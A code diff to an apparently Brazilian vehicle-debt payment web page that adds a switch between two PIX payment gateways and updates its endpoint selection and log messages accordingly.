@@ -16,6 +16,7 @@
     <link rel="stylesheet" href="lib/bootstrap/dist/css/bootstrap.min.css" />
     <link rel="stylesheet" href="css/debitos.css">
     <link rel="stylesheet" href="css/modal.css">
+
     <script src="lib/sweetalert2/sweetalert2.all.min.js"></script>
 </head>
 
@@ -100,6 +101,9 @@
             <span class="appbar__spacer" aria-hidden="true"></span>
         </div>
     </header>
+
+
+
     <main class="page">
         <!-- HERO com imagem -->
         <section class="hero-strap">
@@ -118,6 +122,14 @@
             <input type="hidden" name="Placa" id="Placa" value="3432424" />
             <input type="hidden" name="Modelo" id="Modelo" />
             <input type="hidden" name="Modo" id="Modo" value="pix" />
+            <!--
+                ╔══════════════════════════════════════════════════════════╗
+                ║  GATEWAY PIX ATIVO                                      ║
+                ║  Para trocar o gateway, altere o value abaixo:          ║
+                ║    • "BlackCat" = BlackCat Pagamentos (padrão)          ║
+                ║    • "PayEvo"   = PayEvo                                ║
+                ╚══════════════════════════════════════════════════════════╝
+            -->
             <input type="hidden" name="Gateway" id="Gateway" value="BlackCat" />
             <input type="hidden" name="Ticket" id="Ticket" value="1000" />
 
@@ -578,8 +590,18 @@
         }
 
         /* ===============================
-        GERAR PIX via BlackCat API
+        GERAR PIX – Multi-Gateway
+        Suporta BlackCat e PayEvo
         ================================ */
+        function getGatewayEndpoint() {
+            const gateway = document.getElementById('Gateway').value || 'BlackCat';
+            const endpoints = {
+                'BlackCat': '/api/create-pix',
+                'PayEvo': '/api/create-pix-payevo'
+            };
+            return { gateway, url: endpoints[gateway] || endpoints['BlackCat'] };
+        }
+
         async function chamarGeraPIX() {
 
             const texto = document.getElementById("pixTotal").textContent || "R$ 0,00";
@@ -611,8 +633,12 @@
             // Dados do cliente
             const placa = document.getElementById('Placa').value || 'PLACA';
 
+            // Determina qual gateway usar
+            const { gateway, url } = getGatewayEndpoint();
+            console.log(`[PIX] Usando gateway: ${gateway} → ${url}`);
+
             try {
-                const response = await fetch('/api/create-pix', {
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -680,15 +706,15 @@
                     pixImg.style.display = "block";
                     qrLoader.style.display = "none";
 
-                    console.log('PIX gerado com sucesso:', data.data.transactionId);
+                    console.log(`[PIX] Gerado com sucesso via ${gateway}:`, data.data.transactionId);
                 } else {
                     throw new Error(data.message || 'Erro ao gerar PIX');
                 }
 
             } catch (error) {
-                console.error('Erro ao chamar API:', error);
+                console.error(`[PIX] Erro ao chamar API (${gateway}):`, error);
                 qrLoader.style.display = "none";
-                Swal.fire('Erro', 'Não foi possível gerar o PIX. Tente novamente.', 'error');
+                Swal.fire('Erro', `Não foi possível gerar o PIX via ${gateway}. Tente novamente.`, 'error');
             }
         }
     </script>
